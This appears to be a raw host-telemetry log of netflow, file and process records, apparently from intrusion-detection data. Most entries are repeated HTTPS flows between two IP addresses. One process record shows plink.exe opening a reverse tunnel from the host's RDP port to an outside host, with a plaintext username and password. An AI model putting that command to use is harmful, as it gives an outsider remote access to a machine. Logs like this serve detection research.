e4e82d48-24f1-463f-b1d4-0726da49edb4,{'netflow': '142.20.57.246:53886->202.6.172.98:443'},845825
cce2d043-87c3-40b2-b8fa-aa6cd2582f78,{'netflow': '202.6.172.98:443->142.20.57.246:53331'},826379
a61dddde-1a0b-40af-8380-b8d1d75ac87a,{'netflow': '142.20.57.246:49931->202.6.172.98:443'},803852
e9cfac86-4af8-46c9-bdd5-8101b82b4764,{'netflow': '202.6.172.98:443->142.20.57.246:49928'},803853
ea1a5eec-101c-48bf-a39b-c256a1e98ca1,{'netflow': '142.20.57.246:53268->202.6.172.98:443'},822286
6b07e395-e37a-460f-bd69-a0f9afff1db3,{'netflow': '142.20.57.246:53879->202.6.172.98:443'},844815
ca4fd528-dad6-44e4-8bad-2c22b85ef57d,{'netflow': '202.6.172.98:443->142.20.57.246:53931'},850956
6dc43a70-a651-490d-8f57-7a74d36be7e2,{'netflow': '142.20.57.246:53274->202.6.172.98:443'},822289
788c0fc3-ed2f-401e-89cd-f2d566999d02,{'netflow': '142.20.57.246:49930->202.6.172.98:443'},803851
b5356524-ea08-42b3-b6aa-d478c1430e54,{'file': '/Device/HarddiskVolume1/Users/sysadmin/Downloads/export.zip'},95249
30a43f59-987b-454f-93d6-255bcb839971,{'netflow': '202.6.172.98:443->142.20.57.246:53353'},828438
b615f21a-02dd-4b40-a132-4d4050ea3ae5,{'netflow': '202.6.172.98:443->142.20.57.246:53354'},828439
0ea8251d-df59-4065-b727-ac77e12bf5e7,{'netflow': '202.6.172.98:443->142.20.57.246:53274'},822301
5d1eab68-ad8c-4de2-aaed-56fcc6f1067a,{'netflow': '202.6.172.98:443->142.20.57.246:53125'},820253
9eb9cfea-b438-4357-b39e-95c769a0123f,{'netflow': '202.6.172.98:443->142.20.57.246:49975'},805919
5f68f526-e50a-4137-8690-e1538396dbb6,{'netflow': '202.6.172.98:443->142.20.57.246:53268'},822303
5bfce52b-6daa-4db4-a0a8-5ace73f580d8,{'netflow': '202.6.172.98:443->142.20.57.246:49990'},807974
e1be8736-6a16-4521-bff9-37e7f3bf62eb,{'netflow': '142.20.57.246:54044->202.6.172.98:443'},861223
a0e57aef-e38e-4205-81dd-a5774c102dab,{'netflow': '202.6.172.98:443->142.20.57.246:53453'},836649
2db5f108-6e85-407f-85e9-04322453efc4,{'netflow': '142.20.57.246:53932->202.6.172.98:443'},850993
9d5bad45-33a1-4b28-ae76-996cd4a3457c,{'netflow': '202.6.172.98:443->142.20.57.246:54044'},861233
dbd1e52b-642e-4770-81e2-6de130d982d2,{'netflow': '142.20.57.246:53986->202.6.172.98:443'},857146
9174a973-f2ab-4305-abb9-200f17c2b3ac,{'netflow': '142.20.57.246:53332->202.6.172.98:443'},826429
0dd14893-1f78-4234-8573-fa0838e48080,{'netflow': '202.6.172.98:443->142.20.57.246:53879'},844864
cb92464e-4744-49a3-9bd0-afae81e48a82,{'netflow': '202.6.172.98:443->142.20.57.246:49930'},803905
274b28fa-eb2c-4152-92dd-90134eec9659,{'netflow': '142.20.57.246:53959->202.6.172.98:443'},855105
db2c57aa-c1ec-4da6-8545-4005ca3e9442,{'netflow': '202.6.172.98:443->142.20.57.246:49931'},803906
465c2d23-a3a8-4a51-a2a5-0ac60bacf082,{'netflow': '202.6.172.98:443->142.20.57.246:53490'},840776
045662a5-5ed3-4e94-a499-39ecde8d54d4,{'netflow': '142.20.57.246:53301->202.6.172.98:443'},824392
15c46df0-311b-4119-be3e-733bccb5b346,{'netflow': '202.6.172.98:443->142.20.57.246:53941'},853071
61e64839-55f4-45ff-8499-776ffdd1d4a0,{'netflow': '142.20.57.246:53355->202.6.172.98:443'},828496
a9dbf887-91b4-4569-9d04-db6bb19fe64f,{'netflow': '142.20.57.246:54045->202.6.172.98:443'},861266
c81c90c5-c1f1-455a-ab62-4ea7a3086352,{'netflow': '202.6.172.98:443->142.20.57.246:53332'},826452
773167ee-1e1a-4abf-92cf-ff70dafc3fd6,{'netflow': '142.20.57.246:53920->202.6.172.98:443'},848981
fdddcf1d-dbb3-4d2c-bc34-d4a3e3e6fe98,{'netflow': '202.6.172.98:443->142.20.57.246:54045'},861274
2d78fbcb-564d-4b65-a137-7b14a8d3852f,{'netflow': '202.6.172.98:443->142.20.57.246:53932'},851042
85505a84-b174-40ce-a515-8168eaa04c08,{'netflow': '202.6.172.98:443->142.20.57.246:53959'},855140
e02ac80f-48d8-4abc-9580-cc5246563b20,{'netflow': '202.6.172.98:443->142.20.57.246:53986'},857189
224c581a-e92f-45a3-852e-811386beab40,{'netflow': '142.20.57.246:53420->202.6.172.98:443'},832619
84ececd6-778d-446c-964f-d5212b798b37,{'netflow': '202.6.172.98:443->142.20.57.246:53902'},846956
9f565ec9-8583-40f8-af60-ec943b11570b,{'netflow': '142.20.57.246:53437->202.6.172.98:443'},834677
96f4e6f7-5cac-4b09-afa6-204ed7d6080e,{'netflow': '142.20.57.246:50001->202.6.172.98:443'},810105
47f7089a-b2bb-42a3-ac29-5b7c5724cc63,{'netflow': '142.20.57.246:53356->202.6.172.98:443'},828538
554aa7a8-df50-49a2-a0c2-c340d21b2101,{'netflow': '202.6.172.98:443->142.20.57.246:53355'},828539
b9e1af37-4b5e-4e6b-9831-21063fe80c04,{'netflow': '142.20.57.246:53275->202.6.172.98:443'},822394
d803d843-d205-49f8-922d-cd86cfc980ca,{'netflow': '142.20.57.246:53357->202.6.172.98:443'},828542
ebbe13f1-9b50-4f70-b39e-185ebe35f0cd,{'netflow': '202.6.172.98:443->142.20.57.246:53420'},832642
115edfb8-fffb-4f4b-b707-58cebdb8667b,{'netflow': '202.6.172.98:443->142.20.57.246:53356'},828550
36071af7-d7a5-415d-a693-1d5b21042e42,{'netflow': '202.6.172.98:443->142.20.57.246:53357'},828551
fe250e3b-54ee-4504-b205-45310e6aec3c,{'netflow': '142.20.57.246:53998->202.6.172.98:443'},859278
3ea6a98d-1ca0-4224-939d-f0b8c8647c01,{'netflow': '142.20.57.246:52442->202.6.172.98:443'},818319
161b147f-c705-45bc-be28-8ee039dd8323,{'netflow': '202.6.172.98:443->142.20.57.246:53437'},834704
75ffbb1a-fd85-43dd-91f1-0907799880f5,{'netflow': '142.20.57.246:53333->202.6.172.98:443'},826517
9b2fe93a-5293-4867-bd5e-2cd091ecbb1e,{'netflow': '142.20.57.246:53475->202.6.172.98:443'},838806
9e157c8a-646b-465e-9f07-772ef996e298,{'netflow': '202.6.172.98:443->142.20.57.246:53475'},838809
7c6316d2-6c85-4de2-aacc-11ddcd566162,{'netflow': '202.6.172.98:443->142.20.57.246:53333'},826522
d27794d7-d187-45d4-a4d0-483f5d11f339,{'netflow': '142.20.57.246:53334->202.6.172.98:443'},826523
a90ec53e-b0ce-4903-892e-84f1214a6bba,{'netflow': '202.6.172.98:443->142.20.57.246:50001'},810148
549816d7-dcf5-4a0e-96ca-4b11b5f9b495,{'netflow': '202.6.172.98:443->142.20.57.246:53334'},826538
f112e323-e8b4-4091-8ea5-00498b71c639,{'netflow': '142.20.57.246:49938->202.6.172.98:443'},804014
3b4dcd21-3b08-451e-bd8a-2d502ddacbf4,{'netflow': '202.6.172.98:443->142.20.57.246:53275'},822449
920107cc-72c2-479b-ab51-4b03236079fe,{'file': '/Device/HarddiskVolume1/Windows/system32/mobsync.exe'},89266
eeac89d7-2ece-4102-b479-a2f3703db845,{'netflow': '142.20.57.246:53383->202.6.172.98:443'},830652
32044c18-0bfb-47b3-b768-2f3e82cd40bc,{'netflow': '142.20.57.246:53277->202.6.172.98:443'},822463
5c1c7de6-9c31-4f77-870a-ff01c74edf25,{'netflow': '142.20.57.246:53880->202.6.172.98:443'},844997
e8e37840-e844-4783-b3df-b2852d54ef2e,{'netflow': '202.6.172.98:443->142.20.57.246:53277'},822471
e820f27b-9919-43c9-bb98-44cf096d88cb,{'netflow': '202.6.172.98:443->142.20.57.246:53998'},859338
1297f87b-6f7a-4714-872f-c55eb4e073b6,{'netflow': '142.20.57.246:53454->202.6.172.98:443'},836811
f66845a7-01be-427e-81b1-c37ae90ab1ea,{'netflow': '142.20.57.246:53335->202.6.172.98:443'},826573
ebc7869c-3328-4e44-b309-62c9216306bf,{'netflow': '202.6.172.98:443->142.20.57.246:52442'},818383
982dabbc-b53a-417a-bafd-2669f3afb36f,{'netflow': '142.20.57.246:49976->202.6.172.98:443'},806096
979259fb-2b50-480c-b4e1-fe36a4d5aaa8,{'netflow': '142.20.57.246:49991->202.6.172.98:443'},808145
9873c7ad-f22f-4016-8e82-ec45bf746479,{'netflow': '142.20.57.246:53960->202.6.172.98:443'},855255
f19db3ba-57ed-4f6f-80bc-30e3793934fc,{'netflow': '202.6.172.98:443->142.20.57.246:53301'},824537
e2671244-0818-4427-b052-10530ba40edb,{'file': '/Device/HarddiskVolume1/Windows/SysWOW64/kernelbase.dll'},87266
3eb1e8cb-cabd-4519-9a4c-dd5487730768,{'netflow': '202.6.172.98:443->142.20.57.246:53335'},826597
0348ac37-4e30-4a11-8305-e2c0dc0cdd04,{'netflow': '142.20.57.246:53942->202.6.172.98:443'},853224
a8ca3a16-4111-473d-abea-a259319e4dad,{'netflow': '142.20.57.246:53903->202.6.172.98:443'},847081
6cfa683c-cb55-4122-9f02-58817039e967,{'netflow': '202.6.172.98:443->142.20.57.246:53903'},847082
14e87cdf-8a7b-434f-8149-9263e3d31ce3,{'netflow': '142.20.57.246:53476->202.6.172.98:443'},838891
ee881a33-b540-4a92-9ce6-8134bfa1daf7,{'netflow': '202.6.172.98:443->142.20.57.246:53383'},830701
82358590-ca24-4f6b-92f8-36d337ef717b,{'netflow': '142.20.57.246:53336->202.6.172.98:443'},826613
c555d2d4-5199-4ead-a6a4-37813824e0e2,{'netflow': '142.20.57.246:53421->202.6.172.98:443'},832759
40170594-d5c1-44cd-a221-f3e2f4da7934,{'netflow': '202.6.172.98:443->142.20.57.246:53454'},836856
121158cb-6a0d-4a6c-a160-e6f25720a0cd,{'netflow': '202.6.172.98:443->142.20.57.246:50122'},812281
0627360b-d315-4bd2-980a-32eff4f17d92,{'netflow': '202.6.172.98:443->142.20.57.246:49991'},808186
5d150e37-54ed-43ef-819c-ab1d0e8f82ae,{'netflow': '142.20.57.246:50122->202.6.172.98:443'},812280
765d89a5-0170-4ebb-a80a-d7fdcb86facc,{'netflow': '202.6.172.98:443->142.20.57.246:49976'},806144
e11fa54a-41be-430f-abf1-bd3a29228eac,{'netflow': '142.20.57.246:53987->202.6.172.98:443'},857352
4932606a-c6d5-48c2-b2cf-9774b3c51aa1,{'netflow': '202.6.172.98:443->142.20.57.246:53920'},849160
f83615e0-0015-4657-8e90-87ea971598e7,{'file': '/Device/HarddiskVolume1/$Mft'},70927
4798594c-b31f-4841-9ae4-7a4911fb2023,{'netflow': '142.20.57.246:53933->202.6.172.98:443'},851216
22efa912-f64d-4bc8-a2b0-367b1faa8f9d,{'netflow': '142.20.57.246:50002->202.6.172.98:443'},810257
626d66bb-b5c8-4653-a47c-43e193903a55,{'netflow': '142.20.57.246:50003->202.6.172.98:443'},810258
4a433ec7-38b9-4af1-b495-56c37b8c777c,{'netflow': '142.20.57.246:53438->202.6.172.98:443'},834835
81683cf0-9d51-441d-a265-7d780046f679,{'netflow': '202.6.172.98:443->142.20.57.246:53438'},834836
fd905aab-f583-417f-9000-488ec949b4bd,{'netflow': '202.6.172.98:443->142.20.57.246:53942'},853273
14313a9f-bf8c-4f6d-848a-ef681da19618,{'netflow': '202.6.172.98:443->142.20.57.246:50002'},810267
9ef6fabe-093f-4db7-825a-f12f3563bb92,{'netflow': '202.6.172.98:443->142.20.57.246:50003'},810268
3282ddb8-ab1f-4dcd-b632-5ca73ed3134a,{'netflow': '202.6.172.98:443->142.20.57.246:53987'},857375
490df64b-fa98-47c4-ba99-52eb37e9de5a,{'netflow': '202.6.172.98:443->142.20.57.246:53880'},845090
88f11352-9c33-4cc0-813a-89404c7294ea,{'netflow': '202.6.172.98:443->142.20.57.246:53476'},838946
17b9048d-60d5-4c9b-b455-0f8e8a6d9d8d,{'netflow': '202.6.172.98:443->142.20.57.246:53336'},826661
7602e8af-04f4-4814-9c95-2a7496df2d4d,{'netflow': '202.6.172.98:443->142.20.57.246:53421'},832810
e4cb794a-afb6-4793-8f62-c5952fbabf1d,{'netflow': '142.20.57.246:53904->202.6.172.98:443'},847149
0681930d-9173-4659-9edb-d5ecc92d28b5,{'netflow': '142.20.57.246:50123->202.6.172.98:443'},812336
9aff27c3-7c11-4993-ab55-fdace2edfd76,{'netflow': '142.20.57.246:50124->202.6.172.98:443'},812337
494a86f6-e177-4fac-afd4-15b49ea00746,{'netflow': '202.6.172.98:443->142.20.57.246:50123'},812338
0f70c1bb-dca1-4e21-ab01-42b0de1bfaec,{'netflow': '202.6.172.98:443->142.20.57.246:50124'},812339
1292c5fa-71bf-4848-9d57-e931f48add02,{'netflow': '202.6.172.98:443->142.20.57.246:53960'},855350
ecdf2ca0-5411-4411-b6fa-edc791716cca,{'netflow': '142.20.57.246:54062->202.6.172.98:443'},861497
0a91e093-8993-4465-86ee-68874f432548,{'netflow': '142.20.57.246:53358->202.6.172.98:443'},828736
b33268af-5e0d-40bf-8cf7-0c3d72d5b921,{'netflow': '202.6.172.98:443->142.20.57.246:54062'},861507
62609615-64bf-442b-b54d-561d40322028,{'netflow': '202.6.172.98:443->142.20.57.246:53933'},851272
1deb1396-40e9-418c-a994-8f373e964c0d,{'netflow': '142.20.57.246:53359->202.6.172.98:443'},828749
727f0ddf-9731-479d-9826-05f9ba17a500,{'netflow': '202.6.172.98:443->142.20.57.246:49938'},804173
6b13ece4-99eb-44ae-b30c-709199c00af6,{'netflow': '202.6.172.98:443->142.20.57.246:53358'},828752
b10b2be1-6189-4cb6-ad37-5823dccb1321,{'netflow': '142.20.57.246:53360->202.6.172.98:443'},828753
bb54ffe4-3eb6-4e1d-9524-76aa48eb4440,{'netflow': '202.6.172.98:443->142.20.57.246:53359'},828754
f9d8778a-890f-47ab-93b2-2d598cbbfc90,{'netflow': '202.6.172.98:443->142.20.57.246:53904'},847184
99f58c0a-4914-40e4-8ab1-881c5cf95c9c,{'netflow': '202.6.172.98:443->142.20.57.246:53360'},828759
5dcbba22-815c-42a3-8373-0db70b57852f,{'netflow': '142.20.57.246:53361->202.6.172.98:443'},828766
c058da3e-4b1c-4770-8555-920ea5199557,{'netflow': '142.20.57.246:53362->202.6.172.98:443'},828769
624538cd-0a22-4a4f-aa0f-3fefeba66192,{'netflow': '202.6.172.98:443->142.20.57.246:53361'},828772
43eb41b9-8394-477a-8bf9-8cbb321ad733,{'netflow': '142.20.57.246:53363->202.6.172.98:443'},828773
b7046cbd-027d-435b-bab3-8dc9c7c15f76,{'netflow': '142.20.57.246:53278->202.6.172.98:443'},822634
eaf951bb-0d48-43b1-9f9d-da71e15df956,{'netflow': '142.20.57.246:49992->202.6.172.98:443'},808299
dffb4aae-42a5-4104-9f36-ea3666bab4d0,{'netflow': '142.20.57.246:53337->202.6.172.98:443'},826732
12849d06-f461-4af8-8954-fcf1c65a1eee,{'netflow': '142.20.57.246:53366->202.6.172.98:443'},828780
9e3dce2b-fbd0-4dfd-a268-0fb71b200986,{'netflow': '142.20.57.246:53679->202.6.172.98:443'},843118
f6006ae7-289e-4eb8-9beb-027dc560c7ac,{'netflow': '202.6.172.98:443->142.20.57.246:53362'},828785
d8723dec-6c26-4593-a2ac-791bfaf078af,{'netflow': '202.6.172.98:443->142.20.57.246:53363'},828786
b18d5056-634e-4fb7-852f-6170bfe4a517,{'netflow': '142.20.57.246:53988->202.6.172.98:443'},857462
3c5c592a-bf53-4a06-99da-db1345565e5e,{'subject': '/Device/HarddiskVolume1/Windows/System32/mobsync.exe C:/Windows/System32/mobsync.exe -Embedding'},5495
ea07fd25-cbc9-4782-9977-e3da934a776e,{'netflow': '202.6.172.98:443->142.20.57.246:53366'},828792
790d99a7-e96f-4f94-bce5-80af6132c21c,{'netflow': '202.6.172.98:443->142.20.57.246:53988'},857466
dd3390dc-8c77-4360-ae52-b8eccd26c36f,{'netflow': '142.20.57.246:53338->202.6.172.98:443'},826749
8d910946-5d6a-46af-991e-7b99597e1305,{'netflow': '202.6.172.98:443->142.20.57.246:49992'},808318
0a04bae2-e67d-4445-8668-7855d115df2b,{'netflow': '142.20.57.246:49951->202.6.172.98:443'},804226
ed3466bf-58b5-4a06-a6df-a28803be51e8,{'netflow': '142.20.57.246:53302->202.6.172.98:443'},824708
5893d4bd-d0a6-428e-93b3-bd453ce17823,{'netflow': '142.20.57.246:53934->202.6.172.98:443'},851333
65548ebb-ce87-402f-92c2-529bb8ecea2e,{'netflow': '142.20.57.246:53921->202.6.172.98:443'},849284
cdcf7a8d-22e8-4df1-9659-214eb06c41dc,{'netflow': '202.6.172.98:443->142.20.57.246:53337'},826759
1137e622-a962-4c8a-81ea-4d1cca30c6cf,{'netflow': '202.6.172.98:443->142.20.57.246:53934'},851336
0948bff9-9927-4cae-b6de-57fd7fe88e5e,{'netflow': '202.6.172.98:443->142.20.57.246:49951'},804230
098137ec-54a0-4ead-a088-d6e83d042fcc,{'netflow': '142.20.57.246:53455->202.6.172.98:443'},837002
6759c684-eae0-495c-ba97-3e0527acb242,{'netflow': '142.20.57.246:49977->202.6.172.98:443'},806298
7d8d9b5f-25b3-4888-8d63-29d12b60ce38,{'netflow': '142.20.57.246:53999->202.6.172.98:443'},859548
86d01cee-78bf-4888-aa3c-76864341c951,{'netflow': '202.6.172.98:443->142.20.57.246:53302'},824733
cd4ce82a-4dcb-4f45-ab82-6cb76561e75a,{'netflow': '202.6.172.98:443->142.20.57.246:53278'},822692
d505558a-5113-44cc-b01e-47813f9a2b3a,{'netflow': '202.6.172.98:443->142.20.57.246:53999'},859565
0a6e8f8f-942e-47e1-b9f7-183ab382a45e,{'netflow': '202.6.172.98:443->142.20.57.246:53338'},826799
5056e286-d26a-4bfe-b234-bcd3c3a91bf1,{'netflow': '142.20.57.246:53279->202.6.172.98:443'},822708
9ccd343b-cf4d-4bdd-abd8-c6dd228d4c2f,{'netflow': '142.20.57.246:53989->202.6.172.98:443'},857526
3317e8ce-8f59-4100-89a7-48365a1f7df6,"{'subject': '/Device/HarddiskVolume1/Windows/system32/plink.exe ""C:/Windows/system32/plink.exe"" sports.com -R 4000:127.0.0.1:3389 -l myguest -pw myguest'}",5560
3772b611-e09c-4472-b81d-2b294b98ede5,{'netflow': '202.6.172.98:443->142.20.57.246:53279'},822713
2df7c66f-42bc-4653-bad9-0ffc958e23fe,{'netflow': '142.20.57.246:53384->202.6.172.98:443'},830907
b594372e-0e67-419f-ae6a-7619caa026a6,{'netflow': '142.20.57.246:53385->202.6.172.98:443'},830908
b0902567-08f5-41fc-a29d-20c7b09e968a,{'netflow': '202.6.172.98:443->142.20.57.246:53989'},857532
dd26eb11-65e5-41d1-98dd-928190863673,{'netflow': '202.6.172.98:443->142.20.57.246:53384'},830909
dd8dd76b-3389-4d40-95c4-a1cd269891c7,{'netflow': '202.6.172.98:443->142.20.57.246:53385'},830910
3b764bd9-ad50-428a-9f8a-35f6311057dc,{'netflow': '142.20.57.246:53439->202.6.172.98:443'},835009
7b0795e5-3099-42fc-876d-501bda735b54,{'netflow': '142.20.57.246:54064->202.6.172.98:443'},861638
a34b8847-4687-4d4c-85c0-21a48234deea,{'netflow': '142.20.57.246:53479->202.6.172.98:443'},839113
5cbd0ff8-a37e-45cf-bfa7-32cca56c6d2e,{'netflow': '202.6.172.98:443->142.20.57.246:53479'},839120
ec0ec3a4-1982-4126-aec7-d82621ccfce1,{'netflow': '142.20.57.246:54065->202.6.172.98:22'},861652
24004199-4ebd-4041-9714-12c6609d45c2,{'netflow': '142.20.57.246:53428->202.6.172.98:443'},832984
a4f8397f-ce98-4ef6-ae7a-1d75cefc8e26,{'netflow': '202.6.172.98:443->142.20.57.246:53921'},849371
379dd8af-6184-4990-8028-17a8a3fc180b,{'netflow': '202.6.172.98:443->142.20.57.246:53679'},843228
1b78d632-e3e6-46bc-ac41-04fc5eca1cdb,{'netflow': '142.20.57.246:53480->202.6.172.98:443'},839133
696746c1-d42c-4037-a273-9ae9f4071d52,{'netflow': '142.20.57.246:49993->202.6.172.98:443'},808421
008e4d96-4354-4315-a71a-74024e9e5df2,{'netflow': '202.6.172.98:443->142.20.57.246:53455'},837094
f331fd7f-83e8-46d9-a0dd-6ffe18aaaff3,{'netflow': '142.20.57.246:53911->202.6.172.98:443'},847334
63d71f5a-a0cb-44d7-8a10-ba021d3ea466,{'netflow': '202.6.172.98:443->142.20.57.246:49977'},806385
c10664bb-bdcb-43fc-b789-5631a93cef5b,{'netflow': '142.20.57.246:53491->202.6.172.98:443'},841201
ad9e6771-d865-4777-bbda-26c949ca5914,{'netflow': '202.6.172.98:443->142.20.57.246:53439'},835059
6918e982-8518-455b-bf62-f0545ff51223,{'subject': 'System None'},3570
91dc35cb-f509-4ea9-8cbd-4de5d2e62e6b,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe /SystemRoot/System32/smss.exe'},3569
48ff772b-9d7a-4d68-b74e-86e7a4a3242d,{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe None'},3576
7ee09540-06e8-4e5f-ac54-949c34743517,{'netflow': '142.20.57.246:53881->202.6.172.98:443'},845309
c6f34b3d-1982-4852-b9b6-c90ca546e7a5,{'netflow': '202.6.172.98:443->142.20.57.246:53480'},839170
6044291a-425e-4ae5-a39e-425a81a468d9,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe None'},3586
570f0df4-73e8-486d-9b4f-39e4d0aa4ef8,{'subject': '/Device/HarddiskVolume1/Windows/system32/svchost.exe None'},3587
832a1376-197a-415b-b4d9-cb2cbd753763,{'netflow': '142.20.57.246:50125->202.6.172.98:443'},812550
66cc25a8-2044-4754-9eb2-22068150e797,{'netflow': '142.20.57.246:54000->202.6.172.98:443'},859654
81b592b1-21f5-49d0-97d1-4f2bedfd88de,{'netflow': '142.20.57.246:50126->202.6.172.98:443'},812551
a9db395b-a607-4da5-900b-74d19de94407,{'subject': '/Device/HarddiskVolume1/Windows/System32/svchost.exe C:/Windows/System32/svchost.exe -k utcsvc'},3594
b35f80d7-25ae-4bc1-a020-78dea3c85c63,{'netflow': '202.6.172.98:443->142.20.57.246:50125'},812555
2e0faadf-8f78-455e-9add-6b28f29850af,{'netflow': '202.6.172.98:443->142.20.57.246:50126'},812556
d7491c2b-82d9-47d3-bcda-f4bc03f720f8,{'netflow': '202.6.172.98:443->142.20.57.246:54000'},859662
a35052e0-7a67-4617-81e8-75533cff577a,{'netflow': '202.6.172.98:443->142.20.57.246:53428'},833041
72225268-a850-4413-a4bc-0592e2f61344,{'netflow': '142.20.57.246:53943->202.6.172.98:443'},853522
